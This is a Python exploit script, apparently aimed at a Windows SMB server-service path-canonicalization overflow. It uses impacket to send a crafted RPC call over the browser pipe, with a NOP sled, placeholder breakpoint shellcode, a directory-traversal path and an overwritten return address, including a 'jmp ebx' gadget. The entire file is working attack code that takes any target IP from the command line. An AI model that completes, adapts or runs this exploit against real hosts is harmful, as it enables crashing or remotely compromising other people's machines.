# exploit.py

import struct
import time
import sys

from impacket import smb
from impacket import uuid
from impacket.dcerpc.v5 import transport

shellcode =  b"\xcc" * 100

if len(shellcode) >= 410:
    print(f'Shellcode is too large: {len(shellcode)}')
    sys.exit(1)

num_nops = 410 - len(shellcode)
newshellcode = b"\x90" * num_nops
newshellcode += shellcode
shellcode = newshellcode

data_size = 78

def get_deadbeef() -> bytes:
    exploit = b'A' * 4 + struct.pack('<I', 0xDEADBEEF)
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def get_exploit() -> bytes:
    exploit = b''
    exploit += b'A' * 4
    exploit += struct.pack('<I', 0x771f1544) # jmp ebx
    exploit += (data_size - len(exploit)) * b'A'

    return exploit

def validate_args() -> bool:

    return True

def main():
    try:
        target = sys.argv[1]
        port = int(sys.argv[2])
    except IndexError:
        print('\nUsage: %s <target ip> <Port #>\n' % sys.argv[0])
        print('Example: python3 dos.py 192.168.1.1 445')
        sys.exit(-1)

    exploit = get_deadbeef()

    print(len(exploit))

    if port == 445:
        trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % target)
    else:
        trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % target, dstport=port, filename='\\browser')
    
    trans.connect()

    dce = trans.DCERPC_class(trans)
    dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
    
    path = (
        '\\'.encode('utf-16le') + 
        b"ABCDEFGHIJ" * 10 + 
        shellcode + 
        '\\..\\..\\'.encode('utf-16le') + 
        'ABCDEFG'.encode('utf-16le') + 
        exploit +
        b"\x00" * 2
    )
    
    server = b"\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
    prefix = b"\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
    
    MaxCount = b"\x36\x01\x00\x00"
    Offset = b"\x00\x00\x00\x00"
    ActualCount = b"\x36\x01\x00\x00"

    stub = server + MaxCount + Offset + ActualCount + path + b"\xE8\x03\x00\x00" + prefix + b"\x01\x10\x00\x00\x00\x00\x00\x00"

    print(len(path))
    print(MaxCount)

    dce.call(0x1f, stub)
    time.sleep(3)

if __name__ == '__main__':
    main()
